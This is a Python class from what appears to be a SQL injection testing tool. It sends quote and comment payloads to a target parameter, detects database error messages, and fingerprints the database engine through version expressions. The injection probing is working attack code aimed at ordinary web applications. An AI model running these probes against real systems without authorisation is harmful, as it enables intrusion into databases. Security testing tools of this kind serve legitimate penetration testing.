from core.Analyzer import Analyzer
from core.Requester import Requester
from utils.constants import InjectionContext, fingerprints
from utils.Logger import Logger


class ErrorInjector:
    """
    Error SQLi relies on database error messages.
    """

    def __init__(self, requester: Requester, analyzer: Analyzer):
        self.requester = requester
        self.analyzer = analyzer

    def detect_context(self, param, value):
        """
        Determine the prefix and suffix of our SQL queries according to the
        way the target query is formed.
        """

        Logger.info("Context detection...")
        response = self.requester.send({param: f"{value}'"})
        # Logger.debug(response)

        if self.analyzer.has_sql_error(response):
            Logger.info("Detected SQL error message with quote in the parameter...")

            response = self.requester.send({param: f"{value}' -- -"})
            if not self.analyzer.has_sql_error(response):
                Logger.info(
                    "SQL error is avoided with commenting trailing characters..."
                )

                return InjectionContext(
                    prefix=f"{value}' ", suffix=" -- -", name="quoted"
                )

        return InjectionContext(prefix=f"{value} ", suffix="", name="unquoted")

    def detect_database_engine(self, param: str, ctx: InjectionContext) -> str:
        """
        Detect the database engine by testing engine-specific version
        expressions and checking whether the resulting query produces
        an SQL error.

        ***This method should only be used if the error injection test has succeeded.
        """
        for engine, fingerprint in fingerprints.items():
            payload = f"{ctx.prefix}AND {fingerprint.version} IS NOT NULL{ctx.suffix}"
            response = self.requester.send({param: payload})

            if not self.analyzer.has_sql_error(response):
                return engine

        return "Unknown"

    def test(self, param: str, value: str) -> tuple[list[str] | None, str]:
        """
        Test the different payloads to check if they produce SQL error messages.
        If they do, it would mean that the injection has worked.
        """

        payloads = ["'", '"', f"{value}' -- -", f"{value}'"]
        payloads_success = []  # payload which injection worked
        database = None

        for p in payloads:
            response = self.requester.send({param: p})
            # Logger.debug(f"payload: {p}")
            # Logger.debug(f"response: {response.body}")

            if self.analyzer.has_sql_error(response):
                if not database:
                    database = self.analyzer.detect_database(response.body)
                payloads_success.append(p)

        return payloads_success, (database or "Unknown")
